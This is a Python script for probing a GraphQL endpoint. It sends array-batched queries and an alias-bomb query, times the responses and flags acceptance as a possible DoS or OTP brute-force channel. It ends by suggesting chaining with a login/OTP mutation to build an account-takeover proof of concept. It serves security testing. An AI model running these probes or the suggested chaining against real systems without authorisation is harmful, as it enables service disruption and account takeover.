#!/usr/bin/env python3
"""gql_batch_probe.py — GraphQL batching DoS / alias bomb probe.

Sends N identical operations in one POST (array batching) and an alias bomb
query, measures response time and status, and flags whether batching is
accepted (potential DoS amplifier or OTP brute-force channel).

Usage:
  python3 gql_batch_probe.py --endpoint https://target.com/graphql
  python3 gql_batch_probe.py --endpoint ... --batch 100 --aliases 500
  python3 gql_batch_probe.py --endpoint ... --header "Cookie: session=abc"
  python3 gql_batch_probe.py --help
"""

import argparse
import json
import subprocess
import sys
import time


def _post(endpoint: str, headers: list, payload: str) -> tuple:
    curl_args = ["curl", "-s", "--max-time", "45", "-X", "POST", endpoint,
                 "-H", "Content-Type: application/json", "-d", payload,
                 "-w", "\n__STATUS:%{http_code}__TIME:%{time_total}"]
    for h in headers:
        curl_args += ["-H", h]
    try:
        r = subprocess.run(curl_args, capture_output=True, text=True, timeout=50)
        return r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return "", "timeout"


def _parse(out: str) -> tuple:
    status, elapsed = "?", "?"
    for line in out.splitlines():
        if "__STATUS:" in line and "__TIME:" in line:
            status = line.split("__STATUS:")[1].split("__")[0]
            elapsed = line.split("__TIME:")[1].strip()
    return status, elapsed


def main() -> int:
    ap = argparse.ArgumentParser(description="Probe GraphQL array batching and alias bombing.")
    ap.add_argument("--endpoint", required=True, help="GraphQL endpoint URL")
    ap.add_argument("--header", action="append", default=[], help="Extra HTTP header (repeatable)")
    ap.add_argument("--batch", type=int, default=100, help="Number of operations per batch (default 100)")
    ap.add_argument("--aliases", type=int, default=500, help="Number of aliases in alias bomb (default 500)")
    args = ap.parse_args()

    print(f"[*] Endpoint: {args.endpoint}")

    # Baseline single query
    t0 = time.time()
    single_out, _ = _post(args.endpoint, args.header, json.dumps({"query": "{ __typename }"}))
    single_status, single_time = _parse(single_out)
    print(f"[*] Single query: HTTP {single_status}  {single_time}s")

    # Array batching
    batch_payload = json.dumps([{"query": "{ __typename }"}] * args.batch)
    batch_out, _ = _post(args.endpoint, args.header, batch_payload)
    batch_status, batch_time = _parse(batch_out)
    print(f"[*] Batch of {args.batch}: HTTP {batch_status}  {batch_time}s")

    if batch_out.lstrip().startswith("["):
        print(f"[HIT] Array batching ACCEPTED ({args.batch} ops in one request) — potential DoS / brute-force amplifier")
    else:
        print("[-]  Array batching rejected or no batch response")

    # Alias bomb
    aliases = " ".join(f"q{i}: __typename" for i in range(args.aliases))
    alias_payload = json.dumps({"query": "{ " + aliases + " }"})
    alias_out, _ = _post(args.endpoint, args.header, alias_payload)
    alias_status, alias_time = _parse(alias_out)
    print(f"[*] Alias bomb ({args.aliases} aliases): HTTP {alias_status}  {alias_time}s")
    if f"q0" in alias_out:
        print("[HIT] Alias bomb ACCEPTED — rate-limit/OTP brute-force bypass possible")
    else:
        print("[-]  Alias bomb blocked or limited")

    print("\nNext: if batching is accepted, chain with a login/OTP mutation to build an ATO PoC.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
